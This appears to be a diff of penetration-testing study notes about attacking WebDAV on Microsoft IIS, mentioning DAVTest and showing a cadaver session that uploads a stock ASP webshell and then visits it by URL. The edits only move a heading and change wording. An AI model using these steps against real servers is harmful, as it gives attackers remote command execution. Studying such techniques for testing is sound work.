@@ -1,5 +1,6 @@
 # HTTP
 
+## WebDAV
 - Microsoft IIS
   - Hosts Web pages developed in ASP.NET and PHP.
   - Supported executable file extensions: .asp, .aspx, .config, .php.
@@ -8,7 +9,6 @@
   - Manage files on remote Web server.
   - Requires credentials.
 
-## WebDAV
 - "DAVTest tests WebDAV-enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable."
 
 ```
@@ -35,7 +35,7 @@ Password: <password>
 dav:/webdav/> help
 dav:/webdav/> ls
 dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
-==> A webshell is a shell that you can access through the Web. It is not a reverse shell.
+==> A webshell is a shell that you can access through the Web. It is NOT a reverse shell.
 
 http://<ip>/webdav/webshell.asp
 ```
